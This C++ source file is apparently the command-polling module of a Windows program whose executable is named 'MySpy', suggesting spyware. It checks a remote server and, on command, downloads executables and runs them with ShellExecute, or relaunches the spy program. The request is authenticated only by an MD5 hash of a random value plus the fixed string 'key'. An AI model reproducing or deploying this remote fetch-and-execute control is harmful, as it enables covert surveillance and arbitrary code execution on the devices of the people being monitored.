// Filename: class.command.cpp
// Author:   Patryk Po³eæ

#include "engine.h"

////////////////////////////////////////////////////////////////////////////////////////////////// Constructor and destructor
C_Command::C_Command(C_Base *_objBase): objBase(_objBase)
{
	// Private fields
	hashMD5 = new C_Scrambler;

	curl    = new C_Curl;

	random.clear();
}

C_Command::~C_Command()
{
	delete curl;
	delete hashMD5;
}

////////////////////////////////////////////////////////////////////////////////////////////////// Public methods
int C_Command::CheckCommand()
{
	random = hashMD5->Random();

	bufferStringStream.str("");
	bufferStringStream << "device=" << objBase->nsdUsersUserDevice << "&random=" << random << "&code=" << hashMD5->Hash(random + "key", MD5);

	curl->Request(objBase->psfApiCheckCommandPhp, bufferStringStream.str());

	if(curl->Split(curl->GetSourcePage(0, 5), command) > 0)
	{
		if(command[0] == "1" || command[0] == "2" || command[0] == "3") {DeleteApplication(command[0]); return 1;}
		if(command[1] == "1" || command[1] == "2" || command[1] == "3") {UpdateApplication(command[1]); return 1;}
		if(command[2] == "1")                                           {ResetApplication();            return 1;}
	}

	return 0;
}

////////////////////////////////////////////////////////////////////////////////////////////////// Private methods
void C_Command::DeleteApplication(string _command)
{
         if(_command == "1") curl->DownloadFile(objBase->psfUsersDeleteExe,           objBase->pcfDeleteExe);
	else if(_command == "2") curl->DownloadFile(objBase->psfUsersUserDeleteExe,       objBase->pcfDeleteExe);
	else if(_command == "3") curl->DownloadFile(objBase->psfUsersUserDeviceDeleteExe, objBase->pcfDeleteExe);

	ShellExecute(0, "open", objBase->pcfDeleteExe.c_str(), 0, 0, SW_SHOWDEFAULT);
}

void C_Command::UpdateApplication(string _command)
{
	     if(_command == "1") curl->DownloadFile(objBase->psfUsersUpdateExe,           objBase->pcfUpdateExe);
	else if(_command == "2") curl->DownloadFile(objBase->psfUsersUserUpdateExe,       objBase->pcfUpdateExe);
	else if(_command == "3") curl->DownloadFile(objBase->psfUsersUserDeviceUpdateExe, objBase->pcfUpdateExe);

	ShellExecute(0, "open", objBase->pcfUpdateExe.c_str(), 0, 0, SW_SHOWDEFAULT);
}

void C_Command::ResetApplication()
{
	ShellExecute(0, "open", objBase->pcfMySpyExe.c_str(), 0, 0, SW_SHOWDEFAULT);
}